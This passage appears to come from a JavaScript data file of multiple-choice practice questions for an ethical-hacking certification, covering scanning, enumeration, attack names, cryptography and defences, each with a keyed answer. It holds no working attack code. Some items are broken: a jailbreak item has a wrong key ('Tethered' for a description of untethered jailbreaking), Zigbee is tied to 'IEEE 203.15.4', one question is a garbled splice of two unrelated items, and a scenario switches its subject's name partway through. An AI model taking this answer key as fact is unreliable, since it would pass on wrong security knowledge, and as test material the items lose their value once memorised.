      'Advanced persistent threat',
    ],
    correctAnswer: 'Advanced persistent threat',
  },
  {
    question:
      'What firewall evasion scanning technique make use of a zombie system that has low network activity as well as its fragment identification numbers?',
    options: [
      'Packet fragmentation scanning',
      'Spoof source address scanning',
      'Decoy scanning',
      'Idle scanning',
    ],
    correctAnswer: 'Idle scanning',
  },
  {
    question:
      'Which IOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after each successive reboot?',
    options: [
      'Tethered jailbreaking',
      'Semi-untethered jailbreaking',
      'Semi-tethered jailbreaking',
      'Untethered jailbreaking',
    ],
    correctAnswer: 'Tethered jailbreaking',
  },
  {
    question:
      'Susan, a software developer, wants her web API to update other applications with the latest information. For this purpose, she uses a user-defined HTTP callback or push APIs that are raised based on trigger events; when invoked, this feature supplies data to other applications so that users can instantly receive real-time information. Which of the following techniques is employed by Susan?',
    options: ['Web shells', 'Webhooks', 'REST API', 'SOAP API'],
    correctAnswer: 'Webhooks',
  },
  {
    question:
      'After an audit, the auditors inform you that there is a critical finding that you must tackle immediately. You read the audit report, and the problem is the service running on port 389. Which service is this and how can you tackle the problem?',
    options: [
      'The service is NTP, and you have to change it from UDP to TCP in order to encrypt it.',
      'The service is LDAP, and you must change it to 636, which is LDAPS.',
      'The findings do not require immediate actions and are only suggestions.',
      'The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails.',
    ],
    correctAnswer:
      'The service is LDAP, and you must change it to 636, which is LDAPS.',
  },
  {
    question:
      'Larry, a security professional in an organization, has noticed some abnormalities in the user accounts on a web server. To thwart evolving attacks, he decided to harden the security of the web server by adopting a few countermeasures to secure the accounts on the web server. Which of the following countermeasures must Larry implement to secure the user accounts on the web server?',
    options: [
      'Retain all unused modules and application extensions.',
      'Limit the administrator or root-level access to the minimum number of users.',
      'Enable all non-interactive accounts that should exist but do not require interactive login.',
      'Enable unused default user accounts created during the installation of an OS.',
    ],
    correctAnswer:
      'Limit the administrator or root-level access to the minimum number of users.',
  },
  {
    question:
      'Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network to identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?',
    options: [
      'Credentialed assessment',
      'Internal assessment',
      'External assessment',
      'Passive assessment',
    ],
    correctAnswer: 'Passive assessment',
  },
  {
    question:
      'What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?',
    options: [
      'Performing content enumeration using the bruteforce mode and 10 threads',
      'Performing content enumeration using the bruteforce mode and random file extensions',
      'Skipping SSL certificate verification',
      'Performing content enumeration using a wordlist',
    ],
    correctAnswer: 'Performing content enumeration using a wordlist',
  },
  {
    question:
      "Bob was recently hired by a medical company after it experienced a major cyber security breach. Many patients are complaining that their personal medical records are fully exposed on the Internet and someone can find them with a simple Google search. Bob's boss is very worried because of regulations that protect those data. Which of the following regulations is mostly violated?",
    options: ['PCI DSS', 'PII', 'ISO 2002', 'HIPPA/PHI'],
    correctAnswer: 'HIPPA/PHI',
  },
  {
    question:
      "Allen, a professional pen tester, was hired by XpertTech Solutions to perform an attack simulation on the organization's network resources. To perform the attack, he took advantage of the NetBIOS API and targeted the NetBIOS service. By enumerating NetBIOS, he found that port 139 was open and could see the resources that could be accessed or viewed on a remote system. He came across many NetBIOS codes during enumeration. Identify the NetBIOS code used for obtaining the messenger service running for the logged-in user?",
    options: ['<00>', '<20>', '<03>', '<1B>'],
    correctAnswer: '<03>',
  },
  {
    question:
      "Robin, a professional hacker, targeted an organization's network to sniff all the traffic. During this process, Robin plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Robin in the above scenario?",
    options: [
      'ARP spoofing attack',
      'STP attack',
      'DNS poisoning attack',
      'VLAN hopping attack',
    ],
    correctAnswer: 'STP attack',
  },
  {
    question:
      'During the enumeration phase, Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?',
    options: [
      'Remote procedure call (RPC)',
      'Telnet',
      'Server Message Block (SMB)',
      'Network File System (NFS)',
    ],
    correctAnswer: 'Server Message Block (SMB)',
  },
  {
    question:
      'John, a disgruntled ex-employee of an organization, contacted a professional hacker to exploit the organization. In the attack process, the professional hacker installed a scanner on a machine belonging to one of the victims and scanned several machines on the same network to identify vulnerabilities to perform further exploitation. What is the type of vulnerability assessment tool employed by John in the above scenario?',
    options: [
      'Agent-based scanner',
      'Network-based scanner',
      'Cluster scanner',
      'Proxy scanner',
    ],
    correctAnswer: 'Network-based scanner',
  },
  {
    question:
      'Which of the following protocols can be used to secure an LDAP service against anonymous queries?',
    options: ['NTLM', 'RADIUS', 'WPA', 'SSO'],
    correctAnswer: 'NTLM',
  },
  {
    question:
      'Richard, an attacker, aimed to hack IoT devices connected to a target network. In this process, Richard recorded the frequency required to share information between connected devices. After obtaining the frequency, he captured the original data when commands were initiated by the connected devices. Once the original data were collected, he used free tools such as URH to segregate the command sequence. Subsequently, he started injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices. What is the type of attack performed by Richard in the above scenario?',
    options: [
      'Cryptanalysis attack',
      'Reconnaissance attack',
      'Side-channel attack',
      'Replay attack',
    ],
    correctAnswer: 'Replay attack',
  },
  {
    question:
      'There have been concerns in your network that the wireless network component is not sufficiently secure. You perform a vulnerability scan of the wireless network and find that it is using an old encryption protocol that was designed to mimic wired encryption. What encryption protocol is being used?',
    options: ['RADIUS', 'WPA', 'WEP', 'WPA3'],
    correctAnswer: 'WEP',
  },
  {
    question:
      'Widespread fraud at Enron, WorldCom, and Tyco led to the creation of a law that was designed to improve the accuracy and accountability of corporate disclosures. It covers accounting firms and third parties that provide financial services to some organizations and came into effect in 2002. This law is known by what acronym?',
    options: ['SOX', 'FedRAMP', 'HIPAA', 'PCI DSS'],
    correctAnswer: 'SOX',
  },
  {
    question:
      'Consider the following Nmap output: Starting Nmap X.XX (http://nmap.org) at XXX-XX-XX XX:XX EDT Nmap scan report for 192.168.1.42 Host is up (0.00023s latency). Not shown: 932 filtered ports, 56 closed ports PORT STATE SERVICE - 21/tcp open ftp 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http 110/tcp open pop3 143/tcp open imap 443/tcp open https 465/tcp open smtps 587/tcp open submission 993/tcp open imaps 995/tcp open pop3s Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds What command-line parameter could you use to determine the type and version number of the web server?',
    options: ['-sV', '-sS', '-Pn', '-V'],
    correctAnswer: '-sV',
  },
  {
    question:
      'A newly joined employee, Janet, has been allocated an existing system used by a previous employee. Before issuing the system to Janet, it was assessed by Martin, the administrator. Martin found that there were possibilities of compromise through user directories, registries, and other system parameters. He also identified vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software configuration errors. What is the type of vulnerability assessment performed by Martin?',
    options: [
      'Database assessment',
      'Host-based assessment',
      'Credentialed assessment',
      'Distributed assessment',
    ],
    correctAnswer: 'Host-based assessment',
  },
  {
    question:
      'George is a security professional working for iTech Solutions. He was tasked with securely transferring sensitive data of the organization between industrial systems. In this process, he used a short-range communication protocol based on the IEEE 203.15.4 standard. This protocol is used in devices that transfer data infrequently at a low rate in a restricted area, within a range of 10-100 m. What is the short-range wireless communication technology George employed in the above scenario?',
    options: ['LPWAN', 'MQTT', 'NB-IoT', 'Zigbee'],
    correctAnswer: 'Zigbee',
  },
  {
    question:
      'From the following table, identify the wrong answer in terms of Range (ft). Standard Range (ft) 802.11a 150-150 802.11b 150-150 802.11g 150-150 802.16 (WiMax) 30 miles 802.16 (WiMax) 802.11g 802.11b 802.11a You are a penetration tester and are about to perform a scan on a specific server. The agreement that you signed with the client contains the following specific condition for the scan: `The attacker must scan every port on the server several times using a set of spoofed source IP addresses.` Suppose that you are using Nmap to perform this scan. What flag will you use to satisfy this requirement?',
    options: ['The -g flag', 'The -A flag', 'The -f flag', 'The -D flag'],
    correctAnswer: 'The -D flag',
  },
  {
    question:
      'Dayn, an attacker, wanted to detect if any honeypots are installed in a target network. For this purpose, he used a time-based TCP fingerprinting method to validate the response to a normal computer and the response of a honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect honeypots?',
    options: [
      'Detecting honeypots running on VMware',
      'Detecting the presence of Snort_inline honeypots',
      'Detecting the presence of Honeyd honeypots',
      'Detecting the presence of Sebek-based honeypots',
    ],
    correctAnswer: 'Detecting the presence of Honeyd honeypots',
  },
  {
    question:
      'While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to determine whether the firewall is stateful or stateless, which of the following options would be best to use?',
    options: ['-sA', '-sX', '-sT', '-sF'],
    correctAnswer: '-sA',
  },
  {
    question:
      'Jacob works as a system administrator in an organization. He wants to extract the source code of a mobile application and disassemble the application to analyze its design flaws. Using this technique, he wants to fix any bugs in the application, discover underlying vulnerabilities, and improve defense strategies against attacks. What is the technique used by Jacob in the above scenario to improve the security of the mobile application?',
    options: [
      'Reverse engineering',
      'App sandboxing',
      'Jailbreaking',
      'Social engineering',
    ],
    correctAnswer: 'Reverse engineering',
  },
  {
    question:
      "Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script. After infecting the victim's device, Mason further used Emotet to spread the infection across local networks and beyond to compromise as many machines as possible. In this process, he used a tool, which is a self-extracting RAR file, to retrieve information related to network resources such as writable share drives. What is the tool employed by Mason in the above scenario?",
    options: [
      'NetPass.exe',
      'Outlook scraper',
      'WebBrowserPassView',
      'Credential enumerator',
    ],
    correctAnswer: 'Credential enumerator',
  },
  {
    question:
      "Roma is a member of a security team. She was tasked with protecting the internal network of an organization from imminent threats. To accomplish this task, Roma fed threat intelligence into the security devices in a digital format to block and identify inbound and outbound malicious traffic entering the organization's network. Which type of threat intelligence is used by Roma to secure the internal network?",
    options: [
      'Operational threat intelligence',
      'Strategic threat intelligence',
      'Tactical threat intelligence',
      'Technical threat intelligence',
    ],
    correctAnswer: 'Technical threat intelligence',
  },
  {
    question:
      'Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link and logged in to that page using her valid credentials. Which of the following tools is employed by Clark to create the spoofed email?',
    options: ['Evilginx', 'Slowloris', 'PLCinject', 'PyLoris'],
    correctAnswer: 'Evilginx',
  },
  {
    question:
      'Lewis, a professional hacker, targeted the IoT cameras and devices used by a target venture-capital firm. He used an information-gathering tool to collect information about the IoT devices connected to a network, open ports and services, and the attack surface area. Using this tool, he also generated statistical reports on broad usage patterns and trends. This tool helped Lewis continually monitor every reachable server and device on the Internet, further allowing him to exploit these devices in the network. Which of the following tools was employed by Lewis in the above scenario?',
    options: ['NeuVector', 'Lacework', 'Censys', 'Wapiti'],
    correctAnswer: 'Censys',
  },
  {
    question:
      'You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to prevent intruders from sniffing your traffic. If you did not have a VPN, how would you identify whether someone is performing an ARP spoofing attack on your laptop?',
    options: [
      'You should check your ARP table and see if there is one IP address with two different MAC addresses.',
      'You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.',
      'You should use netstat to check for any suspicious connections with another IP address within the LAN.',
      'You cannot identify such an attack and must use a VPN to protect your traffic.',
    ],
    correctAnswer:
      'You should check your ARP table and see if there is one IP address with two different MAC addresses.',
  },
  {
    question:
      "Jude, a pen tester, examined a network from a hacker's perspective to identify exploits and vulnerabilities accessible to the outside world by using devices such as firewalls, routers, and servers. In this process, he also estimated the threat of network security attacks and determined the level of security of the corporate network. What is the type of vulnerability assessment that Jude performed on the organization?",
    options: [
      'Application assessment',
      'External assessment',
      'Passive assessment',
      'Host-based assessment',
    ],
    correctAnswer: 'External assessment',
  },
  {
    question:
      'Which of the following Google advanced search operators helps an attacker in gathering information about websites that are similar to a specified target URL?',
    options: ['[inurl:]', '[info:]', '[site:]', '[related:]'],
    correctAnswer: '[related:]',
  },
  {
    question:
      'A "Server-Side Includes" attack refers to the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary code remotely. Which web-page file type, if it exists on the web server, is a strong indication that the server is vulnerable to this kind of attack?',
    options: ['.stm', '.cms', '.rss', '.html'],
    correctAnswer: '.stm',
  },
  {
    question:
      'An attacker can employ many methods to perform social engineering against unsuspecting employees, including scareware. What is the best example of a scareware attack?',
    options: [
      'A pop-up appears to a user stating, "You have won a free cruise! Click here to claim your prize!"',
      'A banner appears to a user stating, "Your account has been locked. Click here to reset your password and unlock your account."',
      'A pop-up appears to a user stating, "Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue."',
      'A banner appears to a user stating, "Your Amazon order has been delayed. Click here to find out your new delivery date."',
    ],
    correctAnswer:
      'A pop-up appears to a user stating, "Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue."',
  },
  {
    question:
      'Sam, a web developer, was instructed to incorporate a hybrid encryption software program into a web application to secure email messages. Sam used an encryption software, which is a free implementation of the OpenPGP standard that uses both symmetric-key cryptography and asymmetric-key cryptography for improved speed and secure key exchange. What is the encryption software employed by Sam for securing the email messages?',
    options: ['PGP', 'SMTP', 'GPG', 'S/MIME'],
    correctAnswer: 'GPG',
  },
  {
    question:
      'Harper, a software engineer, is developing an email application. To ensure the confidentiality of email messages, Harper uses a symmetric-key block cipher having a classical 12- or 16-round Feistel network with a block size of 64 bits for encryption, which includes large 8   ֳ — 32-bit S-boxes (S1, S2, S3, S4) based on bent functions, modular addition and subtraction, key-dependent rotation, and XOR operations. This cipher also uses a masking key (Km1) and a rotation key (Kr1) for performing its functions. What is the algorithm employed by Harper to secure the email messages?',
    options: ['CAST-128', 'AES', 'GOST block cipher', 'DES'],
    correctAnswer: 'CAST-128',
  },
  {
    question:
      'John, a professional hacker, targeted CyberSol Inc., an MNC. He decided to discover the IoT devices connected in the target network that are using default credentials and are vulnerable to various hijacking attacks. For this purpose, he used an automated tool to scan the target network for specific types of IoT devices and detect whether they are using the default, factory-set credentials. What is the tool employed by John in the above scenario?',
    options: [
      'IoT Inspector',
      'AT&T IoT Platform',
      'IoTSeeker',
      'Azure IoT Central',
    ],
    correctAnswer: 'IoTSeeker',
  },
  {
    question:
      'Which of the following types of SQL injection attacks extends the results returned by the original query, enabling attackers to run two or more statements if they have the same structure as the original one?',
    options: [
      'Union SQL injection',
      'Error-based injection',
      'Blind SQL injection',
      'Boolean-based blind SQL injection',
    ],
    correctAnswer: 'Union SQL injection',
  },
  {
    question:
      "Which of the following allows attackers to draw a map or outline the target organization's network infrastructure to know about the actual environment that they are going to hack?",
    options: [
      'Vulnerability analysis',
      'Malware analysis',
      'Scanning networks',
      'Enumeration',
    ],
    correctAnswer: 'Scanning networks',
  },
  {
    question:
      'Kevin, an encryption specialist, implemented a technique that enhances the security of keys used for encryption and authentication. Using this technique, Kevin input an initial key to an algorithm that generated an enhanced key that is resistant to brute-force attacks. What is the technique employed by Kevin to improve the security of encryption keys?',
    options: [
      'Key stretching',
      'Public key infrastructure',
      'Key derivation function',
      'Key reinstallation',
    ],
    correctAnswer: 'Key stretching',
  },
  {
    question:
      'Eric, a cloud security engineer, implements a technique for securing the cloud resources used by his organization. This technique assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. Using this technique, he also imposed conditions such that employees can access only the resources required for their role. What is the technique employed by Eric to secure cloud resources?',
    options: [
      'Demilitarized zone',
      'Zero trust network',
      'Serverless computing',
      'Container technology',
    ],
    correctAnswer: 'Zero trust network',
  },
  {
    question:
      'Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP header and the related TCP window size and obtained the following results: TTL: 64 - Window Size: 5840 - What the OS running on the target machine?',
    options: ['Windows OS', 'Mac OS', 'Linux OS', 'Solaris OS'],
    correctAnswer: 'Linux OS',
  },
  {
    question:
      'Thomas, a cloud security professional, is performing security assessment on cloud services to identify any loopholes. He detects a vulnerability in a bare-metal cloud server that can enable hackers to implant malicious backdoors in its firmware. He also identified that an installed backdoor can persist even if the server is reallocated to new clients or businesses that use it as an IaaS. What is the type of cloud attack that can be performed by exploiting the vulnerability discussed in the above scenario?',
    options: [
      'Cloudborne attack',
      'Man-in-the-cloud (MITC) attack',
      'Metadata spoofing attack',
      'Cloud cryptojacking',
    ],
    correctAnswer: 'Cloudborne attack',
  },
  {
    question:
      'An attacker identified that a user and an access point are both compatible with WPA2 and WPA3 encryption. The attacker installed a rogue access point with only WPA2 compatibility in the vicinity and forced the victim to go through the WPA2 four-way handshake to get connected. After the connection was established, the attacker used automated tools to crack WPA2-encrypted messages. What is the attack performed in the above scenario?',
    options: [
      'Cache-based attack',
      'Timing-based attack',
      'Downgrade security attack',
      'Side-channel attack',
    ],
    correctAnswer: 'Downgrade security attack',
  },
  {
    question:
      'Leverox Solutions hired Arnold, a security professional, for the threat intelligence process. Arnold collected information about specific threats against the organization. From this information, he retrieved contextual information about security events and incidents that helped him disclose potential risks and gain insight into attacker methodologies. He collected the information from sources such as humans, social media, and chat rooms as well as from events that resulted in cyberattacks. In this process, he also prepared a report that includes identified malicious activities, recommended courses of action, and warnings for emerging attacks. What is the type of threat intelligence collected by Arnold in the above scenario?',
    options: [
      'Strategic threat intelligence',
      'Operational threat intelligence',
      'Technical threat intelligence',
      'Tactical threat intelligence',
    ],
    correctAnswer: 'Operational threat intelligence',
  },
  {
    question:
      'Alex, a cloud security engineer working in Eyecloud Inc. is tasked with isolating applications from the underlying infrastructure and stimulating communication via well-defined channels. For this purpose, he used an open-source technology that helped him in developing, packaging, and running applications; further, the technology provides PaaS through OS-level virtualization, delivers containerized software packages, and promotes fast software delivery. What is the cloud technology employed by Alex in the above scenario?',
    options: [
      'Virtual machine',
      'Docker',
      'Zero trust network',
      'Serverless computing',
    ],
    correctAnswer: 'Docker',
  },
  {
    question:
      'An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-looking SSID for a nearby business in order to capture the wireless password. What kind of attack is this?',
    options: [
      'MAC spoofing attack',
      'War driving attack',
      'Phishing attack',
      'Evil-twin attack',
    ],
    correctAnswer: 'Evil-twin attack',
  },
  {
    question:
      'Attacker Simon targeted the communication network of an organization and disabled the security controls of NetNTLMv1 by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by Simon?',
    options: [
      'Combinator attack',
      'Dictionary attack',
      'Rainbow table attack',
      'Internal monologue attack',
    ],
    correctAnswer: 'Internal monologue attack',
  },
  {
    question:
      "Stephen, an attacker, targeted the industrial control systems of an organization. He generated a fraudulent email with a malicious attachment and sent it to employees of the target organization. An employee who manages the sales software of the operational plant opened the fraudulent email and clicked on the malicious attachment. This resulted in the malicious attachment being downloaded and malware being injected into the sales software maintained in the victim's system. Further, the malware propagated itself to other networked systems, finally damaging the industrial automation components. What is the attack technique used by Stephen to damage the industrial systems?",
    options: [
      'HMI-based attack',
      'SMishing attack',
      'Reconnaissance attack',
      'Spear-phishing attack',
    ],
    correctAnswer: 'Spear-phishing attack',
  },
  {
    question:
      'This type of injection attack does not show any error message. It is difficult to exploit as it returns information when the application is given SQL payloads that elicit a true or false response from the server. By observing the response, an attacker can extract sensitive information. What type of attack is this?',
    options: [
      'Union SQL injection',
      'Error-based SQL injection',
      'Time-based SQL injection',
      'Blind SQL injection',
    ],
    correctAnswer: 'Blind SQL injection',
  },
  {
    question:
      "Jane is working as a security professional at CyberSol Inc. She was tasked with ensuring the authentication and integrity of messages being transmitted in the corporate network. To encrypt the messages, she implemented a security model in which every user in the network maintains a ring of public keys. In this model, a user needs to encrypt a message using the receiver's public key, and only the receiver can decrypt the message using their private key. What is the security model implemented by Jane to secure corporate messages?",
    options: [
      'Zero trust network',
      'Secure Socket Layer (SSL)',
      'Transport Layer Security (TLS)',
      'Web of trust (WOT)',
    ],
    correctAnswer: 'Web of trust (WOT)',
  },
  {
    question:
      "Mike, a security engineer, was recently hired by BigFox Ltd. The company recently experienced disastrous DoS attacks. The management had instructed Mike to build defensive strategies for the company's IT infrastructure to thwart DoS/DDoS attacks. Mike deployed some countermeasures to handle jamming and scrambling attacks. What is the countermeasure Mike applied to defend against jamming and scrambling attacks?",
    options: [
      'Allow the transmission of all types of addressed packets at the ISP level',
      'Disable TCP SYN cookie protection',
      'Allow the usage of functions such as gets and strcpy',
      'Implement cognitive radios in the physical layer',
    ],
    correctAnswer: 'Implement cognitive radios in the physical layer',
  },
  {
    question:
      'CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted. What is the defensive technique employed by Bob in the above scenario?',
    options: [
      'Whitelist validation',
      'Output encoding',
      'Blacklist validation',
      'Enforce least privileges',
    ],
    correctAnswer: 'Whitelist validation',
  },
  {
    question:
      'Rebecca, a security professional, wants to authenticate employees who use web services for safe and secure communication. In this process, she employs a component of the Web Service Architecture, which is an extension of SOAP, and it can maintain the integrity and confidentiality of SOAP messages. Which of the following components of the Web Service Architecture is used by Rebecca for securing the communication?',
    options: ['WS-Work Processes', 'WS-Security', 'WS-Policy', 'WSDL'],
    correctAnswer: 'WS-Security',
  },
  {
    question:
      "Joel, a professional hacker, targeted a company and identified the types of websites frequently visited by its employees. Using this information, he searched for possible loopholes in these websites and injected a malicious script that can redirect users from the web page and download malware onto a victim's machine. Joel waits for the victim to access the infected web application so as to compromise the victim's machine. Which of the following techniques is used by Joel in the above scenario?",
    options: [
      'Watering hole attack',
      'DNS rebinding attack',
      'MarioNet attack',
      'Clickjacking attack',
    ],
    correctAnswer: 'Watering hole attack',
  },
  {
    question:
      'Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. This further allows the transmission of web-service requests and response messages using different TCP connections. Which of the following attack techniques is used by Stella to compromise the web services?',
    options: [
      'Web services parsing attacks',
      'WS-Address spoofing',
      'SOAPAction spoofing',
      'XML injection',
    ],
    correctAnswer: 'WS-Address spoofing',
  },
  {
    question:
      'Jack, a professional hacker, targets an organization and performs vulnerability scanning on the target web server to identify any possible weaknesses, vulnerabilities, and misconfigurations. In this process, Jack uses an automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other vulnerabilities in the target server. Which of the following tools is used by Jack to perform vulnerability scanning?',
    options: ['Infoga', 'NCollector Studio', 'Netsparker', 'WebCopier Pro'],
    correctAnswer: 'Netsparker',
  },
  {
    question:
      'Given below are different steps involved in the vulnerability-management life cycle. 1) Remediation 2) Identify assets and create a baseline 3) Verification 4) Monitor 5) Vulnerability scan 6) Risk assessment Identify the correct sequence of steps involved in vulnerability management.',
    options: [
      '2-->5-->6-->1-->3-->4',
      '1-->2-->3-->4-->5-->6',
      '2-->4-->5-->3-->6-->1',
      '2-->1-->5-->6-->4-->3',
    ],
    correctAnswer: '2-->5-->6-->1-->3-->4',
  },
  {
    question:
      'Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?',
    options: ['Bluetooth', 'WPA2-Enterprise', 'WPA3-Personal', 'ZigBee'],
    correctAnswer: 'WPA3-Personal',
  },
  {
    question:
      'The security team of Debry Inc. decided to upgrade Wi-Fi security to thwart attacks such as dictionary attacks and key recovery attacks. For this purpose, the security team started implementing cutting-edge technology that uses a modern key establishment protocol called the simultaneous authentication of equals (SAE), also known as dragonfly key exchange, which replaces the PSK concept. What is the Wi-Fi encryption technology implemented by Debry Inc.?',
    options: ['WPA', 'WEP', 'WPA3', 'WPA2'],
    correctAnswer: 'WPA3',
  },
  {
    question:
      'Tony wants to integrate a 128-bit symmetric block cipher with key sizes of 128, 192, or 256 bits into a software program, which involves 32 rounds of computational operations that include substitution and permutation operations on four 32-bit word blocks using 8-variable S-boxes with 4-bit entry and 4-bit exit. Which of the following algorithms includes all the above features and can be integrated by Tony into the software program?',
    options: ['CAST-128', 'RC5', 'TEA', 'Serpent'],
    correctAnswer: 'Serpent',
  },
  {
    question:
      "Which among the following is the best example of the third step (delivery) in the cyber kill chain? An intruder creates malware to be used as a malicious attachment to an email. An intruder's malware is triggered when a target opens a malicious email attachment. An intruder's malware is installed on a targets machine. An intruder sends a malicious attachment via email to a target.",
    options: [
      'An intruder creates malware to be used as a malicious attachment to an email.',
      "An intruder's malware is triggered when a target opens a malicious email attachment.",
      "An intruder's malware is installed on a targets machine.",
      'An intruder sends a malicious attachment via email to a target.',
    ],
    correctAnswer:
      'An intruder sends a malicious attachment via email to a target.',
  },
  {
    question:
      'A security analyst uses Zenmap to perform an ICMP timestamp ping scan to acquire information related to the current time from the target host machine. Which of the following Zenmap options must the analyst use to perform the ICMP timestamp ping scan?',
    options: ['-Pn', '-PU', '-PP', '-PY'],
    correctAnswer: '-PP',
  },
  {
    question:
      'Tony is a penetration tester tasked with performing a penetration test. After gaining initial access to a target system, he finds a list of hashed passwords. Which of the following tools would not be useful for cracking the hashed passwords?',
    options: ['Hashcat', 'John the Ripper', 'THC-Hydra', 'netcat'],
    correctAnswer: 'netcat',
  },
  {
    question:
      "Juliet, a security researcher in an organization, was tasked with checking for the authenticity of images to be used in the organization's magazines. She used these images as a search query and tracked the original source and details of the images, which included photographs, profile pictures, and memes. Which of the following footprinting techniques did Rachel use to finish her task?",
    options: [
      'Google advanced search',
      'Meta search engines',
      'Reverse image search',
      'Advanced image search',
    ],
    correctAnswer: 'Reverse image search',
  },
  {
    question:
      "Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To deliver the malware, he used the current employees' email IDs to send fraudulent emails embedded with malicious links that seem to be legitimate. When a victim employee clicks on the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit. What is the technique used by Jack to launch the fileless malware on the target systems?",
    options: [
      'In-memory exploits',
      'Legitimate applications',
      'Script-based injection',
      'Phishing',
    ],
    correctAnswer: 'Phishing',
  },
  {
    question:
      "An organization decided to harden its security against web-application and web-server attacks. John, a security personnel in the organization, employed a security scanner to automate web-application security testing and to guard the organization's web infrastructure against web-application threats. Using that tool, he also wants to detect XSS, directory transversal problems, fault injection, SQL injection, attempts to execute commands, and several other attacks. Which of the following security scanners will help John perform the above task?",
    options: [
      'AlienVault® OSSIM',
      'Syhunt Hybrid',
      'Saleae Logic Analyzer',
      'Cisco ASA',
    ],
    correctAnswer: 'Syhunt Hybrid',
  },
  {
    question:
      "Calvin, a software developer, uses a feature that helps him auto-generate the content of a web page without manual involvement and is integrated with SSI directives. This leads to a vulnerability in the developed web application as this feature accepts remote user inputs and uses them on the page. Hackers can exploit this feature and pass malicious SSI directives as input values to perform malicious activities such as modifying and erasing server files. What is the type of injection attack Calvin's web application is susceptible to?",
    options: [
      'CRLF injection',
      'Server-side template injection',
      'Server-side JS injection',
      'Server-side includes injection',
    ],
    correctAnswer: 'Server-side includes injection',
  },
  {
    question:
      "Henry is a penetration tester who works for XYZ organization. While performing enumeration on a client organization, he queries the DNS server for a specific cached DNS record. Further, by using this cached record, he determines the sites recently visited by the organization's user. What is the enumeration technique used by Henry on the organization?",
    options: [
      'DNS zone walking',
      'DNS cache snooping',
      'DNS cache poisoning',
      'DNSSEC zone walking',
    ],
    correctAnswer: 'DNS cache snooping',
  },
  {
    question:
      'Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices. Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic information about their network. When analyzing the results of her Whois search, Becky notices that the IP was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for detailed information?',
    options: ['ARIN', 'LACNIC', 'APNIC', 'RIPE'],
    correctAnswer: 'RIPE',
  },
  {
    question:
      'BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to recover the keys from Active Directory. What is this mechanism called in cryptography?',
    options: [
      'Key archival',
      'Certificate rollover',
      'Key escrow',
      'Key renewal',
    ],
    correctAnswer: 'Key escrow',
  },
  {
    question:
      "Which of the following tactics uses malicious code to redirect users' web traffic?",
    options: ['Spear-phishing', 'Phishing', 'Spimming', 'Pharming'],
    correctAnswer: 'Pharming',
  },
  {
    question:
      'Calvin, a grey-hat hacker, targets a web application that has design flaws in its authentication mechanism. He enumerates usernames from the login form of the web application, which requests users to feed data and specifies the incorrect field in case of invalid credentials. Later, Calvin uses this information to perform social engineering. Which of the following design flaws in the authentication mechanism is exploited by Calvin?',
    options: [
      'Password reset mechanism',
      'Insecure transmission of credentials',
      'User impersonation',
      'Verbose failure messages',
    ],
    correctAnswer: 'Verbose failure messages',
  },
  {
    question:
      'Mirai malware targets IoT devices. After infiltration, it uses them to propagate and create botnets that are then used to launch which types of attack?',
    options: [
      'MITM attack',
      'Password attack',
      'Birthday attack',
      'DDoS attack',
    ],
    correctAnswer: 'DDoS attack',
  },
  {
    question:
      "Jude, a pen tester working in Keiltech Ltd., performs sophisticated security testing on his company's network infrastructure to identify security loopholes. In this process, he started to circumvent the network protection tools and firewalls used in the company. He employed a technique that can create forged TCP sessions by carrying out multiple SYN, ACK, and RST or FIN packets. Further, this process allowed Jude to execute DDoS attacks that can exhaust the network resources. What is the attack technique used by Jude for finding loopholes in the above scenario?",
    options: [
      'Spoofed session flood attack',
      'UDP flood attack',
      'Peer-to-peer attack',
      'Ping-of-death attack',
    ],
    correctAnswer: 'Spoofed session flood attack',
  },
  {
    question:
